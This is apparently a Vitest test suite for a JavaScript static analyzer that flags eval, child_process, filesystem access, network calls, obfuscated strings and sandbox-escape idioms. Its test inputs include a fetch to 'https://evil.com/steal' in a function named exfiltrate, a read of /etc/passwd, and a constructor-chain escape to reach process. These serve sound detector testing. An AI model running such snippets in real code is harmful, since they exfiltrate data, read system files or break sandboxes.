import { describe, it, expect } from 'vitest';
import { StaticAnalyzer } from '../StaticAnalyzer.js';

const analyzer = new StaticAnalyzer();

describe('StaticAnalyzer', () => {
  it('should approve safe code', () => {
    const result = analyzer.analyze(`
      function greet(name) {
        return "Hello, " + name;
      }
    `);
    expect(result.severity).toBe('info');
    expect(result.vulnerabilities).toHaveLength(0);
  });

  it('should detect eval() as critical', () => {
    const result = analyzer.analyze(`
      function run(code) {
        return eval(code);
      }
    `);
    expect(result.severity).toBe('critical');
    expect(result.vulnerabilities.some((v) => v.type === 'dangerous_function')).toBe(true);
    expect(result.suspiciousPatterns.some((p) => p.includes('eval'))).toBe(true);
  });

  it('should detect new Function() as critical', () => {
    const result = analyzer.analyze(`
      const fn = new Function('return 1');
    `);
    expect(result.severity).toBe('critical');
    expect(result.vulnerabilities.some((v) => v.type === 'dangerous_function')).toBe(true);
    expect(result.suspiciousPatterns.some((p) => p.includes('new Function()'))).toBe(true);
  });

  it('should detect require("child_process") as critical', () => {
    const result = analyzer.analyze(`
      const cp = require('child_process');
      cp.exec('ls');
    `);
    expect(result.severity).toBe('critical');
    expect(result.vulnerabilities.some((v) => v.type === 'dangerous_module')).toBe(true);
  });

  it('should detect import of dangerous modules', () => {
    const result = analyzer.analyze(`
      import { exec } from 'child_process';
    `);
    expect(result.severity).toBe('critical');
    expect(result.vulnerabilities.some((v) => v.description.includes('child_process'))).toBe(true);
  });

  it('should detect fs access via require', () => {
    const result = analyzer.analyze(`
      const fs = require('fs');
      fs.readFileSync('/etc/passwd');
    `);
    expect(result.vulnerabilities.some((v) => v.type === 'filesystem_access')).toBe(true);
  });

  it('should detect fetch() calls', () => {
    const result = analyzer.analyze(`
      async function exfiltrate() {
        await fetch('https://evil.com/steal');
      }
    `);
    expect(result.vulnerabilities.some((v) => v.type === 'network_request')).toBe(true);
    expect(result.suspiciousPatterns.some((p) => p.includes('evil.com'))).toBe(true);
  });

  it('should detect fetch() with dynamic URL as higher severity', () => {
    const result = analyzer.analyze(`
      async function exfiltrate(url) {
        await fetch(url);
      }
    `);
    expect(
      result.vulnerabilities.some((v) => v.type === 'network_request' && v.severity === 'high'),
    ).toBe(true);
  });

  it('should detect obfuscated strings', () => {
    const result = analyzer.analyze(`
      const payload = "4a6f686e20446f65206973206120746573742075736572";
    `);
    expect(result.vulnerabilities.some((v) => v.type === 'obfuscation')).toBe(true);
  });

  it('should handle parse errors gracefully', () => {
    const result = analyzer.analyze('this is not valid { javascript {{{{');
    expect(result.severity).toBe('info');
    expect(result.vulnerabilities.some((v) => v.type === 'parse_error')).toBe(true);
  });

  it('should detect constructor access as sandbox escape', () => {
    const result = analyzer.analyze(`
      const c = this.constructor.constructor("return process")();
    `);
    expect(result.severity).toBe('critical');
    expect(result.vulnerabilities.some((v) => v.type === 'sandbox_escape' && v.description.includes('constructor'))).toBe(true);
  });

  it('should detect __proto__ access as sandbox escape', () => {
    const result = analyzer.analyze(`
      const p = ({}).__proto__;
    `);
    expect(result.severity).toBe('critical');
    expect(result.vulnerabilities.some((v) => v.type === 'sandbox_escape' && v.description.includes('__proto__'))).toBe(true);
  });

  it('should detect prototype access as sandbox escape', () => {
    const result = analyzer.analyze(`
      const p = Object.prototype;
    `);
    expect(result.severity).toBe('critical');
    expect(result.vulnerabilities.some((v) => v.type === 'sandbox_escape' && v.description.includes('prototype'))).toBe(true);
  });

  it('should detect Proxy usage as sandbox escape', () => {
    const result = analyzer.analyze(`
      const p = new Proxy({}, { get() { return 1; } });
    `);
    expect(result.severity).toBe('critical');
    expect(result.vulnerabilities.some((v) => v.type === 'sandbox_escape' && v.description.includes('Proxy'))).toBe(true);
  });

  it('should detect Reflect usage as sandbox escape', () => {
    const result = analyzer.analyze(`
      const x = Reflect.get({ a: 1 }, 'a');
    `);
    expect(result.severity).toBe('critical');
    expect(result.vulnerabilities.some((v) => v.type === 'sandbox_escape' && v.description.includes('Reflect'))).toBe(true);
  });

  it('should detect arguments.callee as sandbox escape', () => {
    const result = analyzer.analyze(`
      function f() { return arguments.callee; }
    `);
    expect(result.severity).toBe('critical');
    expect(result.vulnerabilities.some((v) => v.type === 'sandbox_escape' && v.description.includes('arguments.callee'))).toBe(true);
  });

  it('should detect dynamic import() as critical', () => {
    const result = analyzer.analyze(`
      const m = import('fs');
    `);
    expect(result.severity).toBe('critical');
    expect(result.vulnerabilities.some((v) => v.type === 'dynamic_import')).toBe(true);
  });

  it('should detect with statement as sandbox escape or parse error', () => {
    const result = analyzer.analyze(`
      with ({ x: 1 }) { console.log(x); }
    `);
    // In module mode "with" is illegal so we may get parse_error; otherwise sandbox_escape
    expect(
      result.vulnerabilities.some(
        (v) =>
          (v.type === 'sandbox_escape' && v.description.includes('with')) || v.type === 'parse_error',
      ),
    ).toBe(true);
  });
});
